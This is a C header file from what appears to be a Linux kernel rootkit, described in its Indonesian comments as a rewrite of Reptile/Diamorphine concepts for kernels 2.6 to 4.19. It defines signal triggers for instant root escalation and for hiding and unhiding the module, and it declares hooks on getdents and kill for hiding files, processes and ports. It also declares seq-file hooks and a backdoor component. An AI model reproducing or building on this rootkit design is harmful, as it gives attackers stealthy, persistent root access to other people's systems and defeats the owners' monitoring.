#ifndef L4X_H
#define L4X_H
/*
 * l4x.h — kontrak backend legacy (2.6.x –4.19).
 * Konsep Reptile/Diamorphine, ditulis ulang; signature mengikuti
 * L4X_OLD_ARGS (lihat kver.h): dua era, dua konvensi.
 *
 * kver.h disertakan DI SINI agar setiap file yang meng-include l4x.h
 * otomatis mendapat guard versi + L4X_OLD_ARGS (perbaikan: file yang
 * hanya include l4x.h sempat kena -Wundef).
 */
#include "kver.h"
#include <linux/types.h>
#include <linux/uaccess.h>

struct pt_regs;

/* sinyal kontrol (gaya Diamorphine — era ini tidak punya /proc/rkit) */
#define L4X_LPE_SIG       63   /* kill -s63 1  -> root */
#define L4X_MODHIDE_SIG   64   /* kill -s64 1  -> sembunyikan modul */
/* CATATAN: batas sinyal x86 =64 — bukti: tanpa modul, os.kill(1,65) ->
 * EINVAL di kernel (diuji via python di WSL).65 hanya bisa "jalan" bila
 * hook menelan sebelum validasi — rapuh. Kini modshow =62 yang valid
 * baik saat modul aktif (hook menelan) maupun tidak (kernel menerima). */
#define L4X_MODSHOW_SIG   62   /* kill -s62 1  -> tampilkan modul (sebelum rmmod) */

#define L4X_MAX_HIDE    32
#define L4X_MAX_PORT    64
#define L4X_NAME_LEN    64

/* core.c — daftar tersembunyi */
void l4x_list_init(const char *names_csv, const char *pids_csv,
		   const char *ports_csv);
bool l4x_is_hidden_name(const char *name);
bool l4x_is_hidden_pid(const char *entry);
bool l4x_is_hidden_port(u16 port);
bool l4x_any_ports(void);

#if L4X_OLD_ARGS
/* ---- konvensi <4.17: argumen individual ---- */
long l4x_sys_getdents64(unsigned int fd, char __user *dirp, unsigned int count);
long l4x_sys_getdents(unsigned int fd, char __user *dirp, unsigned int count);
long l4x_sys_kill(int pid, int sig);
long l4x_call_orig_getdents64(unsigned int fd, char __user *dirp, unsigned int count);
long l4x_call_orig_getdents(unsigned int fd, char __user *dirp, unsigned int count);
long l4x_call_orig_kill(int pid, int sig);
#else
/* ---- konvensi >=4.17: pt_regs ---- */
long l4x_sys_getdents64(const struct pt_regs *regs);
long l4x_sys_getdents(const struct pt_regs *regs);
long l4x_sys_kill(const struct pt_regs *regs);
long l4x_call_orig_getdents64(const struct pt_regs *regs);
long l4x_call_orig_getdents(const struct pt_regs *regs);
long l4x_call_orig_kill(const struct pt_regs *regs);
#endif

/* syscall_hook.c */
int  l4x_hooks_init(void);
void l4x_hooks_exit(void);

/* module_hide.c */
int  l4x_modhide_init(void);
int  l4x_modhide_hide(void);
int  l4x_modhide_show(void);
bool l4x_modhide_active(void);
void l4x_modhide_exit(void);

/* hook_seq.c */
int  l4x_seq_init(void);
void l4x_seq_exit(void);

/* backdoor.c */
int  l4x_backdoor_init(void);
void l4x_backdoor_exit(void);

#endif /* L4X_H */
